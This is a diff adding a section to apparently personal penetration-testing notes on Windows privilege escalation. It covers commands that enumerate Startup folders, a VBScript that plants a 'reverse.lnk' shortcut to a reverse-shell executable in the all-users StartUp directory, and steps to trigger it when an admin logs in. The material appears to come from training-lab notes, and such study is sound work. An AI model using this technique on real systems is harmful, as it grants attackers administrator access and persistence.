@@ -224,6 +224,52 @@ if ($Results) {
 - `-M`  
     **Include files that can be moved.**
     
+
+## Folders
+
+^c48dcd
+
+Each user can define apps that start when they log in, by placing
+shortcuts to them in a specific directory.
+Windows also has a startup directory for apps that should start for all
+users:
+`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`
+If we can create files in this directory, we can use our reverse shell
+executable and escalate privileges when an admin logs in.
+
+All the binaries located in the **Startup folders are going to be executed on startup**. The common startup folders are the ones listed a continuation, but the startup folder is indicated in the registry. [Read this to learn where.](app://obsidian.md/privilege-escalation-with-autorun-binaries.md#startup-path)
+
+```bash
+dir /b "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 2>nul
+
+dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
+dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
+dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
+dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
+Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
+Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
+```
+
+>Note that shortcut files (.lnk) must be used. The following VBScript can be used
+to create a shortcut file "CreateShortcut.vbs" : 
+
+```CreateShortcut.vbs
+Set oWS = WScript.CreateObject("WScript.Shell")
+sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
+Set oLink = oWS.CreateShortcut(sLinkFile)
+oLink.TargetPath = "C:\PrivEsc\reverse.exe"
+oLink.Save
+```
+
+1. Use accesschk.exe to check permissions on the StartUp
+directory:
+`.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`
+2. Note that the BUILTIN\Users group has write access to
+this directory. `RW BUILTIN\Users`
+3. Create a file CreateShortcut.vbs with the VBScript provided in a previous slide. Change file paths if necessary.
+4. Run the script using cscript: `cscript CreateShortcut.vbs`
+5.  Start a listener on Kali, then log in as the admin user to trigger the exploit.
+
 ## Registry
 
 {% hint style="info" %}
